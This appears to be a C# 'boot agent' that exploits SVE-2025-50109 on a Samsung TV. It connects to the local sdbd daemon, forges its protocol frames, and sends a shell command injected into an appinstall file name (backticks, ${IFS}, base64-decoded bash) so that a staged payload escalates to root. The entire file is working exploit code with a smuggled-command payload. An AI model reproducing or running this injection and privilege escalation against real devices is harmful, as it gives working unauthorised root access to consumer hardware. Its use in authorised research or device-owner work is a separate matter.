using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

// Boot agent: runs as the squatted svcapp at boot, talks to sdbd on localhost,
// fires the SVE-2025-50109 appinstall injection, and lets the archive-root
// payload escalate to uid 0 (which then starts RootRelay).
internal static class Program
{
    private const string Pkg = "archive-root-00b0000000000001";
    // Unique per-run path: avoids "Access denied" when a stale, differently-owned
    // /tmp/selfroot-launch.sh exists (e.g. a previous run as root). /tmp is tmpfs,
    // so these are cleared on reboot.
    private static readonly string Script = "/tmp/selfroot-launch-" + Guid.NewGuid().ToString("N") + ".sh";
    private const string LogPath = "/home/owner/share/tmp/selfroot-agent.log";

    private static readonly byte[] Cnxn =
    {
        0x43,0x4E,0x58,0x4E,0x00,0x00,0x10,0x00,
        0x00,0x00,0x04,0x00,0x07,0x00,0x00,0x00,
        0x32,0x02,0x00,0x00,0xBC,0xB1,0xA7,0xB1,
        0x68,0x6F,0x73,0x74,0x3A,0x3A,0x00
    };

    private static void Log(string line)
    {
        try
        {
            File.AppendAllText(LogPath, DateTime.UtcNow.ToString("O") + " " + line + "\n");
        }
        catch
        {
            // logging is best effort
        }
    }

    private static byte[] Frame(string cmd, uint arg0, uint arg1, byte[] data)
    {
        var name = Encoding.ASCII.GetBytes(cmd);
        var frame = new byte[24 + data.Length];
        Array.Copy(name, 0, frame, 0, 4);
        Array.Copy(BitConverter.GetBytes(arg0), 0, frame, 4, 4);
        Array.Copy(BitConverter.GetBytes(arg1), 0, frame, 8, 4);
        Array.Copy(BitConverter.GetBytes((uint)data.Length), 0, frame, 12, 4);
        uint check = 0;
        foreach (var value in data) check += value;
        Array.Copy(BitConverter.GetBytes(check), 0, frame, 16, 4);
        Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(name, 0)), 0, frame, 20, 4);
        Array.Copy(data, 0, frame, 24, data.Length);
        return frame;
    }

    private static string ReadFrame(Socket socket)
    {
        var header = new byte[24];
        int got = 0;
        while (got < 24)
        {
            int read;
            try { read = socket.Receive(header, got, 24 - got, SocketFlags.None); }
            catch (SocketException) { return "timeout"; }
            if (read <= 0) return got == 0 ? "closed" : "partial";
            got += read;
        }
        return Encoding.ASCII.GetString(header, 0, 4);
    }

    private static string BuildLaunchScript()
    {
        var staging = "/home/owner/share/tmp/sdk_tools/" + Pkg;
        var onDemand = "/home/owner/share/tmp/sdk_tools/on-demand";
        return string.Join("\n", new[]
        {
            "#!/bin/sh",
            "set -x",
            "mkdir -p " + staging + " " + onDemand,
            "cp -f /opt/usr/share/selfroot/art/* " + staging + "/ 2>/dev/null",
            "cp -f " + staging + "/" + Pkg + ".tar.gz " + onDemand + "/ 2>/dev/null",
            "cp -f " + staging + "/" + Pkg + ".tar.gz.signature " + onDemand + "/ 2>/dev/null",
            "cd " + staging,
            "/usr/bin/dotnet " + staging + "/SamsungTvArchiveRoot.dll " + Pkg,
            "echo archive-root-exit=$?",
        }) + "\n";
    }

    private static string Injection()
    {
        var command = "cat " + Script + "|bash";
        var base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
        return "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}" + base64
               + "|base64${IFS}-d|bash`.tpk";
    }

    private static void Main()
    {
        try
        {
            var tag = AppContext.BaseDirectory.Trim('/').Replace('/', '_');
            File.AppendAllText("/tmp/selfroot-boot-" + tag + ".log",
                DateTime.UtcNow.ToString("O") + " " + AppContext.BaseDirectory + "\n");
        }
        catch
        {
            // marker is diagnostic only
        }
        Log("boot agent start appdir=" + AppContext.BaseDirectory + " script=" + Script);
        Directory.CreateDirectory("/tmp");
        try
        {
            File.WriteAllText(Script, BuildLaunchScript());
        }
        catch (Exception error)
        {
            Log("cannot write launch script: " + error.Message);
            return;
        }

        Socket socket = null;
        for (int attempt = 0; attempt < 24 && socket == null; attempt++)
        {
            try
            {
                var candidate = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveTimeout = 6000,
                    SendTimeout = 6000
                };
                candidate.Connect("127.0.0.1", 26101);
                candidate.Send(Cnxn);
                var reply = ReadFrame(candidate);
                Log("attempt " + attempt + " cnxn reply " + reply);
                if (reply == "CNXN")
                {
                    socket = candidate;
                    break;
                }
                candidate.Close();
            }
            catch (Exception error)
            {
                Log("attempt " + attempt + " " + error.GetType().Name);
            }
            Thread.Sleep(5000);
        }

        if (socket == null)
        {
            Log("no sdbd session (dev IP must be 127.0.0.1)");
            return;
        }

        using (socket)
        {
            socket.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));
            var capability = ReadFrame(socket);
            Log("capability " + capability);
            if (capability == "OKAY")
            {
                socket.Send(Frame("OKAY", 0x10, 0, new byte[0]));
            }

            var service = Encoding.ASCII.GetBytes("shell:" + Injection() + "\0");
            socket.Send(Frame("OPEN", 0x12, 0, service));
            Log("injection sent (" + service.Length + " bytes)");

            var deadline = DateTime.UtcNow.AddSeconds(25);
            while (DateTime.UtcNow < deadline)
            {
                var frame = ReadFrame(socket);
                if (frame == "timeout") continue;
                if (frame == "closed" || frame == "partial") break;
                if (frame == "OKAY" || frame == "WRTE")
                {
                    try { socket.Send(Frame("OKAY", 0x12, 0, new byte[0])); } catch { }
                }
                if (frame == "CLSE") break;
            }
        }

        Log("injection window closed; waiting for root evidence");
        for (int i = 0; i < 40; i++)
        {
            if (File.Exists("/home/owner/share/tmp/selfroot-evidence.txt"))
            {
                Log("root evidence present");
                return;
            }
            Thread.Sleep(3000);
        }
        Log("no root evidence after 120s");
    }
}
